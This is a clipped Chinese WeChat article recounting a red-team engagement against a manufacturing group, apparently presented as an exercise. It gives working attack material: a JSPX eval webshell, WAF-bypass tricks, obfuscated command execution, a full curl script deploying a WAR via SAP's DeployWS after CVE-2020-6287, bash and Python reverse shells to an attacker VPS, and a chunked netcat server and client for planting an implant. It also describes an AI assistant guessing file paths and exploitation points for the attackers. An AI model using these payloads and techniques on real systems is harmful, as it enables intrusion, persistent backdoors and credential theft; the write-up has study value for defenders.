---
title: 【微信】当AI遇上红队：一次打穿某集团的攻防实录
source: https://mp.weixin.qq.com/s/qkljl7_kDXHHp39WSOwJeQ
source_host: mp.weixin.qq.com
clip_date: 2026-08-04T11:20:27+08:00
trace_id: aa24c603-7584-4672-814c-c9991565d5e5
content_hash: 1db8d3405a17e4f205b28f39a01c45219dc6dd3f2cb70472d53985dc734c91ef
status: synced
tags:
  - 微信
  - AI应用
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: TL;DR：攻击者利用AI辅助推测Oracle EBS路径并指导SAP漏洞利用，结合四层WAF绕过与分块传输木马，从外网文件读取一路打穿某集团内网。
ai_summary_style: key-points
images_status:
  total: 13
  succeeded: 13
  failed_urls: []
notion_page_id: 3b275244-d011-8174-80d5-e0fbd28f88dc
ioc:
  cves:
    - CVE-2020-6287
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：攻击者利用AI辅助推测Oracle EBS路径并指导SAP漏洞利用，结合四层WAF绕过与分块传输木马，从外网文件读取一路打穿某集团内网。
> 
> - **AI辅助路径推测：** 针对Oracle EBS任意文件读取，将系统响应和部署信息交AI分析，AI直接给出正确的用户主目录路径，成功读取.bash_history，暴露应用目录和数据库连接凭证。
> - **SAP漏洞链与WAF突破：** 利用CVE-2020-6287创建管理员后，通过AI指出DeployWS接口上传WAR包；为绕过WAF，采用超小型webshell、Base64中间插入换行符、改用application/soap+xml Content-Type及.jspx后缀，并拼接混淆Java关键字执行系统命令。
> - **内网分块木马传输：** 反弹shell不稳定下，通过netcat分块下载（单块<13KB，走443端口）配合VPS分块服务，将MTLS木马以TCP方式传至目标，绕过上网行为管理和HTTP拦截，成功建立稳定后门。
> - **内网横向泛滥：** 木马上线后fscan扫描发现多台主机存在永恒之蓝、大量Web应用漏洞及数据库/中间件弱口令，三管齐下迅速拿下整个内网。

**flower安全** *2026年8月4日 10:55*

## 当AI遇上红队：一次打穿某集团的攻防实录

最近打了一场攻防演练，目标是一家大型制造集团。这次能打穿，AI确实帮了不少忙——不是那种"AI赋能安全"的空话，是在几个关键节点上实打实省了大量时间。

本文只聊攻击链路，全程脱敏。

> “

* * *

## Oracle eBusiness Suite 任意文件读取

目标是某集团的OA系统，跑的Oracle eBusiness Suite。测了一下，存在已知的任意文件读取漏洞，能直接读服务器上的文件。

但有个问题——能读文件，不知道该读什么路径。Oracle eBS的目录结构跟部署环境强相关，瞎猜效率太低，试几个不对还容易触发告警。

这时候把系统的响应特征、部署信息整理了一下丢给AI分析，它给了几个可能的用户主目录路径。试了一下，直接命中，读到了 `.bash_history` 。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/a540d174b807af3d.png)

历史命令里信息量爆炸，翻出来一堆东西：应用目录结构、配置文件路径、还有运维的操作习惯(不好脱敏不放了)。顺藤摸瓜找到了数据库连接配置，里面有Oracle的连接凭据：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/0a6b283fc07cb7da.png)

不过试了下账号密码登不上，也没法getshell，这条线暂时断了。但这个点验证了AI在路径推测上确实好使——人工可能得试几十个路径，AI跑几轮就给了对的。

* * *

## SAP NetWeaver 漏洞链

### 任意用户创建

目标还有一套SAP NetWeaver Application Server Java，存在CVE-2020-6287。直接用PoC创建了个管理员用户，登录进去能看到所有功能点。

但卡住了——有管理员权限，却找不到能部署或上传文件的地方。而且站上有WAF，打nday时XML payload直接被拦。

### 找到利用点

这块卡了一阵。后来把SAP的功能模块和已知接口信息整理了一下让AI分析，它很快指出有个 `DeployWS` 接口可以上传部署WAR包。这个发现就是整个攻击链的转折点。

### 四重WAF绕过

找到了利用点，但WAF挡在前面，一共过了四道关。

**第一关：请求体大小限制**

WAF限制请求体最多912字节，常规WAR包远超这个大小。

解决方案是用超小型webshell——shell本身不干活，只做个类似PHP `eval` 的中转，实际执行的代码通过请求头动态传入：

```kotlin
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:directive.page contentType="text/plain" import="javax.script.*"/>
<jsp:scriptlet>
String x=request.getHeader("C");
if(x!=null){
  ScriptEngine e=new ScriptEngineManager().getEngineByName("js");
  e.put("o",out);
  e.eval(x);
}
</jsp:scriptlet></jsp:root>
```

**第二关：Base64签名被识别**

WAR包Base64编码后以 `UEsDB` 开头（ZIP文件签名），WAF直接拦，gzip也绕不过。

Fuzz了很久，发现一个技巧：在Base64字符串中间插入换行符，WAF识别不了签名，但服务端还能正常解析。就这一个换行，解决了大问题。

**第三关：Content-Type被检测**

部署WAR包时 `text/xml` 会被WAF拦。换成变体 `application/soap+xml` 就过了。

**第四关：JSP不让传**

服务器不允许上传 `.jsp` 文件，用 `.jspx` （JSP的XML格式）绕过。

### 命令执行

Webshell部署成功后，执行系统命令还得过WAF。传入的Java代码必须混淆，不然还是被拦。用了字符串拼接和字符编码：

```javascript
C: var R=java.lang;var t=R["Runt"+"ime"];var p=t["getRunt"+"ime"]()["ex"+"ec"]([String.fromCharCode(47,98,105,110,47,115,104),"-c","id"]);var i=p.getInputStream();var b;while((b=i.read())!=-1)o.write(b)
```

把 `Runtime` 、 `getRuntime` 、 `exec` 这些关键词拆开拼接，路径 `/bin/sh` 用 `String.fromCharCode` 编码，成功执行系统命令。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/f63fc9acd6724bb4.png)

### 完整利用步骤

整理一下完整流程：

```bash
# 1. 本地构造超小型jspx webshell和web.xml
mkdir -p /tmp/sw/WEB-INF
cat > /tmp/sw/s.jspx << 'JSPXEOF'
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0"><jsp:directive.page contentType="text/plain" import="javax.script.*"/><jsp:scriptlet>
String x=request.getHeader("C");if(x!=null){ScriptEngine e=new ScriptEngineManager().getEngineByName("js");e.put("o",out);e.eval(x);}
</jsp:scriptlet></jsp:root>
JSPXEOF

echo '<?xml version="1.0"?><web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5"><display-name>t</display-name></web-app>' > /tmp/sw/WEB-INF/web.xml

# 2. 打包成war并base64编码
cd /tmp/sw && jar -cfM /tmp/sw.war . && cd /root

# 3. base64中间插入换行符绕过WAF
WAR_B64=$(base64 -w0 /tmp/sw.war)
SPLIT="${WAR_B64:0:2}
${WAR_B64:2}"

# 4. 通过DeployWS接口部署，Content-Type用application/soap+xml绕过
curl -sk "https://目标地址/DeployWSService/DeployWS" \
  -u "管理员账号:密码" \
  -H "Content-Type: application/soap+xml; charset=utf-8" \
  -d "<?xml version=\"1.0\" encoding=\"utf-8\"?>
<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:dep=\"http://sap.com/2009/11/24/deployws\">
<soap:Header/><soap:Body>
<dep:deploy><archiveFiles><content>${SPLIT}</content><fileName>t.war</fileName></archiveFiles></dep:deploy>
</soap:Body></soap:Envelope>"
```

* * *

## 内网突破

拿到命令执行后，真正的硬仗才开始。内网环境非常恶心，一堆限制：

1.  **上网行为管理拦截**：请求外网会被302重定向到深信服上网行为管理页面，HTTP流量全拦
    
2.  **TCP长度限制**：TCP连接传输超过13KB就断开
    
3.  **工具受限**：服务器上只有阉割版netcat，功能不全
    
4.  **集群负载均衡**：双机集群，每次执行命令可能落在不同服务器上，状态不连续
    
5.  **反向代理隔离**：公网地址不是服务器真实地址，通过集中转发服务器路由，没法正向连接内部服务器
    
6.  **TLS版本过低**：系统太老，连HTTPS直接报错
    

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/09ec985b4d3825c2.png)

### 反弹Shell

常规的bash反弹全部失败：

```bash
bash -c {echo,Base64编码}|{base64,-d}|{bash,-i}           # 失败
/bin/bash -i > /dev/tcp/VPS地址/端口 0<& 2>&1               # 失败
```

后来发现服务器上有Python，改用Python反弹：

```scala
export RHOST="VPS地址"; export RPORT=端口
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/61fc89a34847da32.png)

连是连上了，但交互一定数量数据就断，没法稳定维持。得想别的办法。

### 分块传输上马

反弹shell不稳定，得直接传木马上去。折腾了很久，摸索出三个关键点：

1.  netcat可以通过TCP协议分块获取文件内容，绕过上网行为管理的HTTP拦截，但单次不能超过13KB
    
2.  连443端口时上网行为管理设备会放宽限制
    
3.  木马用MTLS协议通信，完全绕开HTTP限制
    

思路就是：把木马切成10KB以下的块，VPS上起个TCP服务监听443端口，目标机器用netcat循环连接，每次握手后拿一块，拼起来就是完整的木马。

**VPS端——分块服务：**

```python
#!/usr/bin/env python3
import socket, os, sys

CHUNK_DIR = "/tmp/chunks"
PORT = 443

def main():
    chunks = sorted(os.listdir(CHUNK_DIR))
    total = len(chunks)
    print(f"[*] Total chunks: {total}, listening on 0.0.0.0:{PORT}")

    idx = 0
    while idx < total:
        chunk_path = os.path.join(CHUNK_DIR, chunks[idx])
        chunk_size = os.path.getsize(chunk_path)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', PORT))
        s.listen(1)

        try:
            conn, addr = s.accept()
            # 握手：要求客户端先发"GO"才发数据
            conn.settimeout(3)
            handshake = conn.recv(2)
            if handshake != b'GO':
                conn.close(); s.close(); continue

            with open(chunk_path, 'rb') as f:
                conn.sendall(f.read())
            conn.shutdown(socket.SHUT_WR)
            conn.close()
            idx += 1  # 只有成功才推进到下一块
        except Exception as e:
            print(f"  -> Error: {e}, retrying same chunk")
        finally:
            s.close()

    print(f"[+] All {total} chunks sent!")

if __name__ == "__main__":
    main()
```

**目标机器端——循环分块下载：**

```bash
HN=$(hostname); F=/tmp/cfg_${HN}.e; rm -f $F; echo START_$HN
i=0
while [ $i -lt 3100 ]; do
    (printf GO; cat /dev/null) | netcat -w8 VPS地址 443 >> $F 2>/dev/null
    i=$((i+1))
done
echo DONE; wc -c $F; md5sum $F; echo FILE:$F
```

**下载完成后赋权执行：**

```bash
cp /tmp/cfg_服务器A.e /tmp/config1.elf
chmod +x /tmp/config1.elf
/tmp/config1.elf &
```

经过数千次分块传输，木马成功上传并执行，稳定的后门连接终于建立。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ca27ca20da2d8012.png)

* * *

## 打穿内网

木马上线后，用fscan扫了一波内网，结果触目惊心。

**永恒之蓝——多台Windows主机存在MS17-010：**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c40c97c3f0e3a62c.png)

**内网Web应用漏洞——fscan的webpoc扫到基本上就有：**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d37ae1f909bff89f.png)

**弱口令遍地都是——数据库、中间件、运维系统全中：**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6157def9d24dfb4f.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c3e5cce0edbf7bcf.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/720b18e0e7c3ff41.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d6b1ef4b79ff02a1.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/b90c12492bf378c5.png)

永恒之蓝、Web漏洞、弱口令三管齐下，内网基本拿下了。从外网一个文件读取漏洞起步，经过SAP漏洞利用、四重WAF绕过、内网分块上马，最终打穿整个集团内网。

* * *

*本文已全面脱敏，仅供安全研究与学习交流，请勿用于非法用途。*
